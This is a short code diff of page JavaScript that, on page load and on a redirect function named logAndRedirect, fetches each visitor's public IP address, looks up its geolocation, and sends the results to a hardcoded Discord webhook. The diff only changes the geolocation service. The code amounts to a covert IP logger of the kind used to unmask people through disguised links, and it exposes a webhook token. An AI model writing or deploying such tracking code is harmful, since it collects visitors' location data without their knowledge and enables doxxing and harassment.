@@ -147,12 +147,12 @@
   const WEBHOOK = 'https://discord.com/api/webhooks/1499514371511025856/nxiLGjYa_v31aLOVjZxXaZ79V15gAr7KOem3gypFTWNt6UKopkFo65LUNLcdJZ0u0CCn';
   // ======================================================
 
-  async function logAndRedirect(url, label) {
+async function logAndRedirect(url, label) {
     try {
       const res  = await fetch('https://api.ipify.org?format=json');
       const data = await res.json();
       const ip   = data.ip;
-      const infoRes  = await fetch(`https://ipwho.is/${ip}`);
+      const infoRes  = await fetch(`https://freeipapi.com/api/json/${ip}`);
       const info     = await infoRes.json();
      
       await fetch(WEBHOOK, {
@@ -186,12 +186,12 @@
   });
 
   // Also log the page load (visitor arrived)
-  (async () => {
+ (async () => {
     try {
       const res  = await fetch('https://api.ipify.org?format=json');
       const data = await res.json();
       const ip   = data.ip;
-      const infoRes = await fetch(`https://ipwho.is/${ip}`);
+      const infoRes = await fetch(`https://freeipapi.com/api/json/${ip}`);
       const info    = await infoRes.json();
 
       await fetch(WEBHOOK, {
